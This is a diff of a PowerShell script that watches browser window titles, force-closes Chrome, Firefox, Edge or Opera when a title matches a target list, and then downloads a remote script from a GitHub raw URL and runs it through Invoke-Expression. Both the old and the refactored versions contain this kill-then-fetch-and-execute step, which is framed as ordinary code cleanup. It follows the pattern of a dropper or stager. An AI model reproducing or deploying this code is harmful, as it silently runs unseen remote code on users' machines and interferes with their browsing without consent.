@@ -7,24 +7,11 @@ $browserProcesses = @("chrome", "firefox", "msedge", "opera")
 # Define the interval to check (in seconds)
 $checkInterval = 15
 
-# Flag to determine if the condition is met
+# Variable to track whether a condition has been met
 $conditionMet = $false
 
-# URL of the action script
-$actionScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/pp.ps1"
-
-# Function to trigger the action script
-function Trigger-ActionScript {
-    Invoke-Expression (iwr $actionScriptUrl).Content
-}
-
-# Outer loop to run continuously
-while ($true) {
-    if ($conditionMet) {
-        Trigger-ActionScript
-        break  # Exit the monitoring loop and trigger the action
-    }
-
+# Loop until any condition is met
+while (-not $conditionMet) {
     foreach ($browserName in $browserProcesses) {
         $currentBrowserProcesses = Get-Process -name $browserName -ErrorAction SilentlyContinue
         if ($currentBrowserProcesses) {
@@ -32,19 +19,39 @@ while ($true) {
                 try {
                     $processTitle = $process.MainWindowTitle
                     Write-Host "$browserName - Window Title: $processTitle"
-                    if ($targetTitles | ForEach-Object { $processTitle -like "*$_*" }) {
-                        Write-Host "Detected one of the specified titles in $browserName. Closing..."
-                        Stop-Process -Id $process.Id -Force
-                        $conditionMet = $true  # Set the flag to true when any condition is met
-                        break 3  # Exit both inner and outer loops when any condition is met
+
+                    $matchingTitles = @()
+                    foreach ($targetTitle in $targetTitles) {
+                        if ($processTitle -like "*$targetTitle*") {
+                            Write-Host "Detected '$targetTitle' in $browserName. Closing..."
+                            $matchingTitles += $targetTitle
+                            Stop-Process -Id $process.Id -Force
+                            $conditionMet = $true  # Set the flag to true when any condition is met
+                        }
+                    }
+
+                    if ($matchingTitles.Count -gt 0) {
+                        Write-Host "Matching titles: $($matchingTitles -join ', ')"
                     }
                 } catch {
-                    # Handle any exceptions that might occur (e.g., due to missing access permissions)
+                    Write-Host "Error: $_"
                 }
             }
         }
     }
 
-    Start-Sleep -Seconds $checkInterval
+    if (-not $conditionMet) {
+        Write-Host "No condition met. Sleeping for $checkInterval seconds..."
+        Start-Sleep -Seconds $checkInterval
+    }
 }
 
+# After the condition is met, download and execute your second script from GitHub
+if ($conditionMet) {
+    $secondScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/pp.ps1"
+    $secondScript = Invoke-WebRequest -Uri $secondScriptUrl
+    Invoke-Expression -Command $secondScript.Content
+}
+
+# Continue with the rest of your script here
+Write-Host "A condition is met. Continue with the rest of your code here."
